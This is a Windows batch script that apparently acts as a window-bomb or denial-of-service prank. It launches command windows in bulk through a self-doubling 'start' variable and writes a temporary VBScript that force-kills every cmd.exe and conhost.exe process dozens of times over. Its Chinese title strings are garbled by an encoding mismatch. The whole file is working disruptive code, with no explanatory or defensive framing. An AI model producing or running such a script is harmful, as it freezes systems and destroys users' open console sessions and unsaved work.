:BAT start
@echo off&>nul chcp 950&setlocal EnableExtensions EnableDelayedExpansion
title �{�����J���K�K Now Loading�K 
goto start

:start
title �u�Ķ�R���K�K Now Loading�K
set a=start 
for /l %%a in (1,1,64) do (
  set a=!a!!a!
  >nul ping /n 1 /w 1000 127.0.0.1
)
set script="%temp%\�ּu�M��%random%.vbs"
>%script% echo;Set UAC=CreateObject^("Shell.Application"^)
for /l %%a in (1,1,64) do >>%script% (
  echo;UAC.ShellExecute "%windir%\System32\taskkill.exe","/f /fi ""imagename eq cmd.exe""","","",0
  echo;UAC.ShellExecute "%windir%\System32\taskkill.exe","/f /fi ""imagename eq conhost.exe""","","",0
)
title �ּu�z�����K�K Now Running�K
for /l %%a in (1,1,64) do (
  !a!
)
title �ּu�M�����K�K Now Ending�K
for /l %%a in (1,1,64) do (
  call %script%
)
del /f /q %script%
exit